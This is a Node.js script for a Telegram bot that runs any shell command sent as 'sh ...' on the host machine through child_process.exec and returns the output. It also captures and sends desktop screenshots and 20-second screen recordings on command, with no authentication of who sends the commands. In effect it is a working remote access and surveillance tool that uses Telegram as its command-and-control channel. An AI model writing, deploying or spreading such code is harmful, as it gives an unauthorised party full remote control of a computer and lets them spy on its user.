var exec = require('child_process').exec;
require('dotenv').config()
const screenshot = require('screenshot-desktop')
const TelegramBot = require('node-telegram-bot-api');
const recordScreen = require('record-screen')

// replace the value below with the Telegram token you receive from @BotFather
const token = process.env.BOT_TOKEN;

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, {polling: true});

// 20 seconds recording
const recordms = 20000;

// Listen for any kind of message. There are different kinds of
// messages.
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
if ((msg.text.toLowerCase()).startsWith("sh")) {
    exec((msg.text).substr(3), (error, stdout, stderr) => {
      //console.log("STDOUT:", stdout, ", STDERR:", stderr);
      bot.sendMessage(chatId, 'STDOUT:'+stdout);
      bot.sendMessage(chatId, 'STDERR:'+stderr);
    });
}

if ((msg.text.toLowerCase()).startsWith("screenshot")) {
    screenshot().then((img) => {
      bot.sendPhoto(chatId, img);
    }).catch((err) => {
      bot.sendMessage(chatId, "An error has occurred doing a screenshot  "+err);
    })
}

if ((msg.text.toLowerCase()).startsWith("record")) {
  bot.sendMessage(chatId,"Recording for "+recordms+"ms. Please wait...")
  
  const recording = recordScreen('./video.mp4', {
    resolution: '1920x1080' // Display resolution
  });

  setTimeout(() => { // wait before stopping the recording
    recording.stop()
  }, recordms) 

  setTimeout(() => { // Extra delay for processing the video
    bot.sendDocument(chatId, './video.mp4')
  }, (recordms+2500))
}
});
